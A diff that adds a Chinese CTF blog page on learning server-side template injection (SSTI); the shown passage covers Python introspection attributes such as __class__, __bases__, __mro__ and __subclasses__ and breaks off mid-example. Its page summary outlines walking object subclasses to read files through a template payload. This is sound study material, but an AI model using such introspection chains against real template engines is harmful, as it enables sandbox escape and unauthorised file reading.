@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ssti学习 | Hexo</title><meta name="keywords" content="python"><meta name="author" content="薯条"><meta name="copyright" content="薯条"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="ssti学习"><meta name="application-name" content="ssti学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="ssti学习"><meta property="og:url" content="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="常用魔术方法__class____class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 __class__ 是类的一个内置属性，表示类的类型，返回 &amp;lt;type &amp;#39;type&amp;#39;&amp;gt; ； 也是类的实例的属性，表示实例对象的类。 12345678&amp;gt;&amp;amp;g"><meta property="og:locale" content="en"><meta property="og:image" content="http://example.com/img/Sherlock.jpg"><meta property="article:author" content="薯条"><meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/Sherlock.jpg"><meta name="description" content="常用魔术方法__class____class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 __class__ 是类的一个内置属性，表示类的类型，返回 &amp;lt;type &amp;#39;type&amp;#39;&amp;gt; ； 也是类的实例的属性，表示实例对象的类。 12345678&amp;gt;&amp;amp;g"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🔍 分享与热心帮助","🤝 喜欢团结协作","🏃 脚踏实地行动派","💢 壮汉人狠话不多"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: 薯条","link":"Link: ","source":"Source: Hexo","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Hexo',
+  title: 'ssti学习',
+  postAI: '',
+  pageFillDescription: '常用魔术方法, __class__, 获取基类, __subclasses__(), __builtins__, __globals__, 利用 SSTI 读取文件, Python 2, Python 3常用魔术方法用来查看变量所属的类根据前面的变量形式可以得到其所属的类是类的一个内置属性表示类的类型返回也是类的实例的属性表示实例对象的类获取基类用来查看类的基类也可以使用数组索引来查看特定位置的值通过该属性可以查看该类的所有直接父类该属性返回所有直接父类组成的元组虽然只有一个元素注意是直接父类下雨下不同获取基类还能用方法方法可以用来获取一个类的调用顺序比如输出结果如下在这个例子中类的顺序是这意味着在搜索方法时解释器会先在中查找然后按照的顺序依次查找父类直到找到匹配的方法或属性除此之外我们还可以利用方法获取直接基类有这些类继承的方法我们就可以从任何一个变量回溯到最顶层基类中去再获得到此基类所有实现的类就可以获得到很多的类和方法了在中是一个特殊方法也称为魔术方法或魔术属性用于获取当前类的直接子类列表当你调用一个类的方法时它会返回一个包含所有直接子类的列表这些子类是在程序运行时动态创建的因此列表的内容取决于程序执行的上下文和流程以下是一个简单的示例输出输出在这个示例中类有两个直接子类和类有一个直接子类因此调用返回的列表包含了和而调用返回的列表只包含了注意这里要记住一点和版本返回的子类不是一样的但是有的大部分都有当然我们也可以直接用会得到和上面一样的结果的主要目的就是从这么多的子类中找出可以利用的类一般是指读写文件或执行命令的类加以利用在中是一个指向内建模块的引用这个模块包含了中内置的常用函数异常和其他对象变量是一个字典包含了内建模块中所有的内置函数和对象你可以通过字典来访问这些内置函数和对象例如你可以通过来访问内置的函数或者通过来访问内置的异常类但是在实际编码中我们通常直接使用内置函数和对象的名称而不是通过来访问例如我们通常使用函数而不是需要注意的是在一些限制性的环境中比如一些解释器中或者在使用了函数时可能会限制对的直接访问在中是一个特殊属性用于访问包含当前作用域中所有全局变量的字典这个属性是一个字典它包含了当前作用域中所有全局变量的名称和对应的值在中每个作用域都有一个与之相关联的字典用于存储该作用域中的全局变量这个字典可以通过访问作用域对象的属性来获取例子如下定义一个全局变量定义一个局部变量输出全局变量字典输出全局变量的值调用函数利用读取文件在上文中我们使用方法查看子类的时候发现可以发现索引号为指向类分析如下获取空字符串的类型即类型获取类型的方法解析顺序这是一个元组包含了当前类和它的父类的顺序获取方法解析顺序中的最后一个类即类获取类的所有子类这是一个列表对获取到的子类列表进行枚举返回索引和对应的元素组成的元组遍历枚举后的元组列表并打印每个元组综上所述这段代码的作用是遍历类的所有直接子类并输出它们的索引和对应的子类此类可以直接用来读取文件使用类读取文件的方法仅限于环境在环境中类已经没有了我们可以用这个类去读取文件首先编写脚本遍历目标环境中这个类索引号得到编号为所以如下双大括号通常用于表示模板语法它们可能用于在某些框架中进行模板渲染比如在前端的或中或者在后端的像等框架中这是中创建一个空的元组并访问该元组的类元组的类是这是访问类的基类它的基类是这是获取类的基类中的第一个元素即这是获取中类的所有子类这个调用会返回一个包含所有子类的列表这是对子类对象的属性进行访问可能是希望访问第个子类对象中名为的方法这是作为参数传递给方法的值可能是为了触发某种行为',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-02 00:18:20',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/Sherlock.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/php-web/" style="font-size: 1.05rem;">-php -web<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF-web/" style="font-size: 1.05rem;">-前端 -web<sup>1</sup></a><a href="/tags/CTF/" style="font-size: 1.05rem;">CTF<sup>1</sup></a><a href="/tags/ctf/" style="font-size: 1.05rem;">ctf<sup>1</sup></a><a href="/tags/php/" style="font-size: 1.05rem;">php<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>2</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>3</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 1.05rem;">后端<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">March 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">February 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">January 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">December 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">November 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">October 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/python/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>python</span></a></span></div></div><h1 class="post-title" itemprop="name headline">ssti学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-01T11:35:21.000Z" title="Created 2024-03-01 19:35:21">2024-03-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-01T16:18:20.834Z" title="Updated 2024-03-02 00:18:20">2024-03-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为福建"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>福建</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/python/" tabindex="-1" itemprop="url">python</a><h1 id="CrawlerTitle" itemprop="name headline">ssti学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">薯条</span><time itemprop="dateCreated datePublished" datetime="2024-03-01T11:35:21.000Z" title="Created 2024-03-01 19:35:21">2024-03-01</time><time itemprop="dateCreated datePublished" datetime="2024-03-01T16:18:20.834Z" title="Updated 2024-03-02 00:18:20">2024-03-02</time></header><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 <code>__class__</code> 是类的一个内置属性，表示类的类型，返回 <code>&lt;type &#39;type&#39;&gt;</code> ； 也是类的实例的属性，表示实例对象的类。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h3><p><code>__bases__</code>：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的<strong>元组</strong>（虽然只有一个元素）。注意是<strong>直接父类</strong>！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__bases__[0]   // python2下雨python3下不同</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获取基类还能用 <code>__mro__</code> 方法，<code>__mro__</code> 方法可以用来获取一个类的调用顺序，比如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(B, C):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(D.__mro__)</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，类 <code>D</code> 的 MRO 顺序是 <code>D -&gt; B -&gt; C -&gt; A -&gt; object</code>。这意味着在搜索方法时，Python 解释器会先在 <code>D</code> 中查找，然后按照 <code>B -&gt; C -&gt; A -&gt; object</code> 的顺序依次查找父类，直到找到匹配的方法或属性</p>
+<p>除此之外，我们还可以利用 <code>__base__</code> 方法获取<strong>直接基类</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__base__</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（<code>&lt;class&#39;object&#39;&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p>
+<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p>在 Python 中，<code>__subclasses__()</code> 是一个特殊方法（也称为魔术方法或魔术属性），用于获取当前类的直接子类列表。</p>
+<p>当你调用一个类的 <code>__subclasses__()</code> 方法时，它会返回一个包含所有直接子类的列表。这些子类是在程序运行时动态创建的，因此列表的内容取决于程序执行的上下文和流程。</p>
+<p>以下是一个简单的示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.__subclasses__())  <span class="comment"># 输出 [&lt;class &#x27;__main__.B&#x27;&gt;, &lt;class 